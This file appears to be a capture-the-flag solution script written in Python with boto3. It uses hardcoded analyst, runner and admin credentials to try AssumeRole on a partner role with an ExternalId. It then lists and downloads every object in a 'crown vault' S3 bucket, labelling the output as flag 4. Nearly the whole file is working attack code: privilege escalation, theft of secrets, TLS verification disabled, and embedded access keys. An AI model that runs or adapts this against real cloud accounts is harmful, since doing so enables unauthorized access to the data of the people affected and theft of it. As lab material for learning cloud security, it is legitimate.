import boto3
import json
import urllib3
urllib3.disable_warnings()

ENDPOINT = "https://web-d94df0e990e63e98.web.h7tex.com"
REGION = "us-east-1"

SECURE_ROLE = "arn:aws:iam::999999999999:role/partner-secure-role"
EXT_ID = "Dc-2026-8f31a97c4b2e"

# 1. Analyst session
s_analyst = boto3.Session(
    aws_access_key_id="AKIAANALYST0000000000",
    aws_secret_access_key="wJalrAnalystSecretKeyEXAMPLEbPxRfiCY",
    region_name=REGION
)

# 2. Runner session
s_runner = boto3.Session(
    aws_access_key_id="ASIA5D40A02C98BE2846",
    aws_secret_access_key="sk/zUEcqj_aoJnJO7AC33lA7XnhJffTtvk_",
    aws_session_token="tok/okEdeZlbPh4Z4GZ5opCKuxph-VBu4sYuzR31D6a03uFZH7lp9cl8BmJI_1qfb3HZ",
    region_name=REGION
)

# 3. Admin session
s_admin = boto3.Session(
    aws_access_key_id="ASIAE67D7B19B5A81056",
    aws_secret_access_key="sk/TKgKZtYUPONYZHhvlZ4s69N70BSxxn6o",
    aws_session_token="tok/3Nn8cYWq3W8qubFf-svfAAksFzipsREu-WsWtcJFyavF4KwqiJJ3jXMfxG0QtaeU",
    region_name=REGION
)

for name, sess in [("admin", s_admin), ("runner", s_runner), ("analyst", s_analyst)]:
    print(f"\n[*] Trying AssumeRole as {name} with ExternalId...")
    sts = sess.client("sts", endpoint_url=ENDPOINT, verify=False)
    try:
        assumed = sts.assume_role(
            RoleArn=SECURE_ROLE,
            RoleSessionName="crown_session",
            ExternalId=EXT_ID
        )
        print(f"[+] Success with {name}!", json.dumps(assumed, indent=2, default=str))
        
        # Test crown vault
        creds = assumed["Credentials"]
        crown_sess = boto3.Session(
            aws_access_key_id=creds["AccessKeyId"],
            aws_secret_access_key=creds["SecretAccessKey"],
            aws_session_token=creds["SessionToken"],
            region_name=REGION
        )
        s3_crown = crown_sess.client("s3", endpoint_url=ENDPOINT, verify=False)
        res = s3_crown.list_objects_v2(Bucket="deputy-crown-vault")
        print("[+] deputy-crown-vault objects:", json.dumps(res, indent=2, default=str))
        for obj in res.get("Contents", []):
            k = obj["Key"]
            body = s3_crown.get_object(Bucket="deputy-crown-vault", Key=k)["Body"].read().decode(errors="replace")
            print(f"[FLAG 4] Content of {k}:\n{body}")
        break
    except Exception as e:
        print(f"[-] Failed with {name}:", e)
